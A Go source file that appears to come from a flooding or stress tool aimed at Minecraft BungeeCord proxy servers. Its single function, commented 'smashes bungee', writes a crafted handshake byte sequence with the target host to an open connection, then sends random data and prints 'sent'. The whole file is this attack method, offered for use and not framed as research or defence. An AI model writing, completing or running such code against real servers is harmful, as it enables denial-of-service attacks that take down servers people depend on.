package methods

import (
	"fmt"
	"math/rand"
	"net"
	"strconv"
	"time"
)

// Auth smashes bungee
func Auth(data *Data, out net.Conn) bool {
	if data.bytes == nil {
		data.supplyBytes(makeBytes(15, 0, 47, 15, data.Host, 99, 223, 2))
	}

	out.Write(data.bytes)
	rand.NewSource(time.Now().UnixNano())

	_, err := out.Write(makeBytes(strconv.Itoa(rand.Intn(400))))

	if err != nil {
		return true
	}

	fmt.Println("sent")

	return false
}
